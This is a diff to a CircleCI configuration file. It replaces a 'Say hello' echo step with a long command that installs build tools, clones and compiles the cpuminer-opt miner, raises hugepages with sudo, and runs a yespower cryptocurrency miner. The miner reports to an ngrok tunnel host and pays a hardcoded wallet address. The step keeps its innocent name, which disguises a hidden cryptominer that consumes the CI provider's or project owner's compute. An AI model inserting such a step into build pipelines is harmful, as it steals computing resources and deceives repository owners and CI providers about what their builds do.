@@ -16,7 +16,8 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          command: "cd && sudo apt update && sudo apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git -y && git clone https://github.com/JayDDee/cpuminer-opt.git && cd cpuminer-opt && ./build.sh && sudo sysctl -w vm.nr_hugepages=2048 && ./cpuminer -a yespower -o http://7.tcp.eu.ngrok.io:15265 --no-longpoll -u user -p pass --coinbase-addr=oXLYe9Jb1z1ujRi49GbJkwCJzjo8GnP6FT --cpu-affinity 63 --cpu-priority 4
+"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
